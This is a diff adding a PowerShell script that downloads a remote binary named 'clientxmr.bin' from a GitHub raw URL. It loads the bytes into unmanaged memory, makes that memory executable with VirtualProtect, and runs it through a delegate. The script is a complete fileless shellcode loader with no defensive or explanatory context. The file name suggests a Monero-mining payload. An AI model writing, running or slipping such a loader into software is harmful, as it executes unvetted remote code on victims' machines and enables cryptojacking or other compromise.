@@ -1,0 +1,44 @@
+# URL of the raw shellcode
+$shellcodeUrl = "https://raw.githubusercontent.com/RedTheMenace/efdfrqfo0we4f9gw3e0gjfwselg/main/clientxmr.bin"
+
+# Download the shellcode
+$shellcodeBytes = (New-Object System.Net.WebClient).DownloadData($shellcodeUrl)
+
+# Allocate memory for the shellcode
+$memoryBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($shellcodeBytes.Length)
+
+# Copy the shellcode to the allocated memory
+[System.Runtime.InteropServices.Marshal]::Copy($shellcodeBytes, 0, $memoryBuffer, $shellcodeBytes.Length)
+
+# Define the necessary PInvoke signatures
+$virtualProtectDefinition = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class MemoryProtection {
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+
+Add-Type -TypeDefinition $virtualProtectDefinition -PassThru
+
+# Change the memory protection to allow execution
+$oldProtection = 0
+[MemoryProtection]::VirtualProtect($memoryBuffer, [UIntPtr]::op_Explicit($shellcodeBytes.Length), 0x40, [ref]$oldProtection) | Out-Null
+
+# Define the delegate to execute the shellcode
+$delegateDefinition = @"
+using System;
+using System.Runtime.InteropServices;
+
+public delegate void ShellcodeDelegate();
+"@
+
+Add-Type -TypeDefinition $delegateDefinition -Language CSharp
+
+# Create the delegate
+$shellcodeDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memoryBuffer, [ShellcodeDelegate])
+
+# Execute the shellcode
+$shellcodeDelegate.Invoke()
